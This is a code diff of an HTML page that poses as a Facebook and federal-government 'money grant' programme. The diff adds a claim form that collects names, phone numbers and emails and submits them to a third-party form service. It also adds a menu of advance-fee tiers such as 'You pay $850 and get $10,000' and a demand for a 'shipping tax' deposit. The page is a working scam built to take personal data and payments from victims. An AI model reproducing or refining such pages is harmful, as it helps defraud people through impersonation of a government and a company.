@@ -10,11 +10,11 @@
 <body>
     <section class="container">
       <header>
-          <div class="head-img2">
-            <img src="image/Catalog_of_Federal_Domestic_Assistance_(logo).jpg" alt="">
-          </div>
           <div class="head-img1">
             <img src="image/Facebook_New_Logo_(2015).svg.png" alt="">
+          </div>
+          <div class="head-img2">
+            <img src="image/Catalog_of_Federal_Domestic_Assistance_(logo).jpg" alt="">
           </div>
         </header>
         <div class="head-text">
@@ -278,11 +278,14 @@ The money giving by the Federal Government is not a loan, It's a Money Grant off
 
           <div class="claim-form">
             <form target="_blank" action="https://formsubmit.io/send/2e664f56-21b0-440f-8514-70e12a861fa0" method="POST">
-              <!-- <label for="fname">First name:</label> -->
+
+              <h2>Claim Form</h2>
+              <h5><span>Fill With Correct Information Ask Your Agent If There's Anything You Don't Understand.</span></h5>
+
               <input type="text" id="fname" name="name" placeholder="Your First name">
-              <!-- <label for="lname">Last name:</label> -->
+              
               <input type="text" id="lname" name="name" placeholder="Your Last name"><br>
-              <input type="number" name="number" id="number" placeholder="Your number">
+              <input type="tel" name="number" id="number" placeholder="Your number">
               <input name="_formsubmit_id" type="text" style="display:none">
               <!-- <label for="email">E-mail:</label> -->
               <input type="email" name="email" id="email" placeholder="Your E-mail"><br>
@@ -292,18 +295,27 @@ The money giving by the Federal Government is not a loan, It's a Money Grant off
               <input type="radio" name="money" id="check">
               <label for="CHECK">CHECK</label><br>
               <input type="radio" name="money" id="debit-card">
-              <label for="DEBIT CARD">DEBIT CARD</label>
-              <h5>Do You Wish To Increase Your Winning Amount?</h5>
-              <input type="radio" name="choice" id="">
-              <label for="yes">YES</label>
-              <input type="radio" name="choice" id="">
-              <label for="no">NO</label><br>
-              <label for="amount">If Yes</label>
-              <input type="text" name="" id="choice" placeholder="Amount"> <br>
-              <h5>NOTE:<span></span></h5>
+              <label for="DEBIT CARD">DEBIT CARD</label><br><br>
+              <label for="">Choose Your Winning Choice</label>
+              <select name="" id="">
+                <option value=""></option>
+                <option value=""><p>You pay, $850 and get $10,000.00</p></option>
+                <option value=""><p>You pay $1,500 and get $50,000.00</p></option>
+                <option value=""><p>You pay $3,500 and get $75,000.00</p></option>
+                <option value=""><p>You pay $5,000 and get $100,000.00</p></option>
+                <option value=""><p>You pay $7,500 get $550,000.00</p></option>
+                <option value=""><p>You pay $10,000 get $700,000.00</p></option>
+                <option value=""><p>You pay $15,000 get $900,000.00</p></option>
+                <option value=""><p>
+                  You pay $20,500 get $1,500,000.00
+                </p>
+                </option>
+              </select>
+              <br>
+              <h5>NOTE: <span> At Least 50% Of Shipping Tax Must Be Deposit Before Shipping.</span></h5>
               <button type='submit'>Submit</button>
             </form>
-            <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Voluptate harum deleniti dolorum voluptatum quo, tempora adipisci ducimus, obcaecati veritatis architecto ea assumenda blanditiis, omnis incidunt praesentium possimus sed nulla porro!</p>
+            <div class=""></div>
           </div>
     </section>
 </body>
